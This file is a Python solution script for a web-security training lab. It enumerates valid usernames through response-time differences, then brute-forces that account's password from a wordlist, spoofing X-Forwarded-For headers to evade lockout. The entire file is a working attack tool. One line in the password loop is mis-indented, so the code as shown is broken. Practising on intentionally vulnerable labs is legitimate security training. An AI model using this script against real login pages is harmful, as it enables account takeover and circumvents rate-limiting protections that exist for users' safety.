# Created by sm6r,2024
# Lab: Username enumeration via response timing
import requests
import sys
import time

if len(sys.argv)!=2:
    print("Usage: solution.py LOGIN_URL")
    exit()

url = sys.argv[1]
usernames= open("usernames.txt","r").readlines()
passwords= open("passwords.txt","r").readlines()
# if you re-run the scipt, change the ip variable so you dont get blocked
ip = "192.168.0."
counter=3
max_time = 0
max_user='x'
flg=True

for user in usernames:
    user=user.strip()
    IP = ip+str(counter)
    counter+=1

    print(f"Username: {user}",end="  "*len(user)+"\r",flush=True)
  
    start=time.time()
    response= requests.post(url,data={'username':user,'password':'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'},headers={'X-Forwarded-For':IP})
    finish=time.time()
    total = finish-start

  
    if response.text.find("You have made too many incorrect login attempts. Please try again in 30 minute(s).")!=-1:
        print("\nSomething went wrong with the IP ...")
        exit()   
    if response.text.find("Gateway Timeout") !=-1:
            print("\nthe URL isn't valid.... ")
            exit()

  
    if total > max_time:
        max_user = user
        max_time=total
        
print(f"The user with the max time is: {max_user}  , with the max time: {max_time}")


for passs in passwords:
    passs=passs.strip()
    IP = ip+str(counter)
    counter+=1
    
    print(f"Password: {passs}",end=" "*len(passs)+"\r",flush=True)
    
  response= requests.post(url,data={'username':max_user,'password':passs},headers={'X-Forwarded-For':IP})
    
    if response.text.find("You have made too many incorrect login attempts. Please try again in 30 minute(s).")!=-1:
        print("\nSomething went wrong with the IP ...")
        exit()


    if  response.text.find("Your username") !=-1:
                print("\n\nFOUND VALID CREDENTIALS\nATTACK DONE SUCCESSFFULLY")
                flg=False
                break

if flg:
    print("DIDNT FIND ANYTHING")
